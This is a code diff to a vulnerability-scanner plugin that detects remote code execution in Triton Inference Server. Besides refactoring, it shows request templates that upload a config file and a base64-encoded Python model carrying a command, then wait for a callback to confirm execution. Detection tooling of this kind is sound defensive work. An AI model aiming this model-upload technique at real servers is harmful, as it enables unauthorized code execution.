@@ -1,5 +1,5 @@
 /*
- * Copyright 2024 Google LLC
+ * Copyright 2020 Google LLC
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -24,8 +24,10 @@ import static com.google.tsunami.common.net.http.HttpRequest.post;
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
-import com.google.common.util.concurrent.Uninterruptibles;
-import com.google.gson.*;
+import com.google.gson.JsonArray;
+import com.google.gson.JsonElement;
+import com.google.gson.JsonObject;
+import com.google.gson.JsonParser;
 import com.google.protobuf.ByteString;
 import com.google.protobuf.util.Timestamps;
 import com.google.tsunami.common.net.http.HttpClient;
@@ -38,9 +40,18 @@ import com.google.tsunami.plugin.annotations.ForWebService;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.plugin.payload.Payload;
 import com.google.tsunami.plugin.payload.PayloadGenerator;
-import com.google.tsunami.proto.*;
+import com.google.tsunami.proto.DetectionReport;
+import com.google.tsunami.proto.DetectionReportList;
+import com.google.tsunami.proto.DetectionStatus;
+import com.google.tsunami.proto.NetworkService;
+import com.google.tsunami.proto.PayloadGeneratorConfig;
+import com.google.tsunami.proto.Severity;
+import com.google.tsunami.proto.TargetInfo;
+import com.google.tsunami.proto.Vulnerability;
+import com.google.tsunami.proto.VulnerabilityId;
+
+import java.io.IOException;
 import java.time.Clock;
-import java.time.Duration;
 import java.time.Instant;
 import java.util.Base64;
 import javax.inject.Inject;
@@ -58,6 +69,10 @@ import javax.inject.Inject;
 public class TritonInferenceServerRceVulnDetector implements VulnDetector {
 
   private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
+  private static final String UPLOAD_CONFIG_PAYLOAD =
+      "{\"parameters\":{\"config\" : \"{}\", \"file:config.pbtxt\" :\"%s\" }}";
+  private static final String UPLOAD_MODEL_PAYLOAD =
+      "{\"parameters\":{\"config\" : \"{}\", \"file:1/model.py\" : \"%s\" }}";
 
   private final PayloadGenerator payloadGenerator;
 
@@ -163,15 +178,15 @@ public class TritonInferenceServerRceVulnDetector implements VulnDetector {
       if (modelNames.bodyString().isEmpty()) {
         return false;
       }
-      JsonArray modelNamesJO =
+      JsonArray modelNamesJo =
           JsonParser.parseString(modelNames.bodyString().get()).getAsJsonArray();
-      if (modelNamesJO.isEmpty()) {
+      if (modelNamesJo.isJsonNull() || modelNamesJo.isEmpty()) {
         return false;
       }
       String anExistingModelName = null;
-      for (JsonElement modelNameJE : modelNamesJO) {
-        if (modelNameJE.isJsonObject()) {
-          JsonObject jsonObject = modelNameJE.getAsJsonObject();
+      for (JsonElement modelNameJe : modelNamesJo) {
+        if (modelNameJe.isJsonObject()) {
+          JsonObject jsonObject = modelNameJe.getAsJsonObject();
           if (jsonObject.has("name")) {
             anExistingModelName = jsonObject.get("name").getAsString();
             break;
@@ -195,7 +210,7 @@ public class TritonInferenceServerRceVulnDetector implements VulnDetector {
               .setRequestBody(
                   ByteString.copyFromUtf8(
                       String.format(
-                          "{\"parameters\":{\"config\" : \"{}\", \"file:config.pbtxt\" :\"%s\" }}",
+                          UPLOAD_CONFIG_PAYLOAD,
                           Base64.getEncoder()
                               .encodeToString(
                                   String.format(MODEL_CONFIG, anExistingModelName).getBytes()))))
@@ -209,7 +224,7 @@ public class TritonInferenceServerRceVulnDetector implements VulnDetector {
               .setRequestBody(
                   ByteString.copyFromUtf8(
                       String.format(
-                          "{\"parameters\":{\"config\" : \"{}\", \"file:1/model.py\" : \"%s\" }}",
+                          UPLOAD_MODEL_PAYLOAD,
                           Base64.getEncoder()
                               .encodeToString(String.format(PYTHON_MODEL, cmd).getBytes()))))
               .build(),
@@ -221,13 +236,30 @@ public class TritonInferenceServerRceVulnDetector implements VulnDetector {
               .withEmptyHeaders()
               .build(),
           networkService);
-
-      Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(10));
-      return payload.checkIfExecuted();
-    } catch (Exception e) {
-      logger.atSevere().log("Failed to send request: %s", e.getMessage());
+    } catch (RuntimeException | IOException e) {
+      logger.atWarning().withCause(e).log(
+          "Fail to exploit '%s'. Maybe it is not vulnerable", rootUri);
       return false;
     }
+
+    if (!payload.getPayloadAttributes().getUsesCallbackServer()) {
+      logger.atWarning().log("Target vulnerable, but callback server is disabled to confirm RCE");
+    } else {
+      // If there is an RCE, the execution isn't immediate
+      logger.atInfo().log("Waiting for RCE callback.");
+      try {
+        Thread.sleep(10000);
+      } catch (InterruptedException e) {
+        logger.atWarning().withCause(e).log("Failed to wait for RCE result");
+        return false;
+      }
+      // Raise the severity to Critical
+      if (payload.checkIfExecuted()) {
+        logger.atInfo().log("RCE payload executed!");
+        return true;
+      }
+    }
+    return false;
   }
 
   private DetectionReport buildDetectionReport(
